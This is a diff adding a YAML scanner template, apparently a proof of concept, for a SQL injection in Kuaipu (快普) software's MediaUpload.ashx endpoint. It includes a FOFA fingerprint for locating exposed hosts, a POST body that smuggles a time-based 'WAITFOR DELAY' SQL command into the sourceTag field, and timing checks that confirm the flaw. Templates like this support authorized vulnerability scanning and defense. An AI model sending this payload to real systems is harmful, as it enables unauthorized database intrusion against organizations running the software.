@@ -1,0 +1,29 @@
+id: poc-yaml-kuaipu-mediaupload-ashx-sqli
+info:
+  name: 快普软件MediaUpload.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 快普软件
+  fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /ashx/Common/MediaUpload.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: upload=check&dasdsa=1&sourceTag=11');WAITFOR DELAY '0 :0:{{.t1}}'--&field=1
+  expression: 'status_code == 200 &&
+
+    body == "\"\"" &&
+
+    contains(content_type,"application/json") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
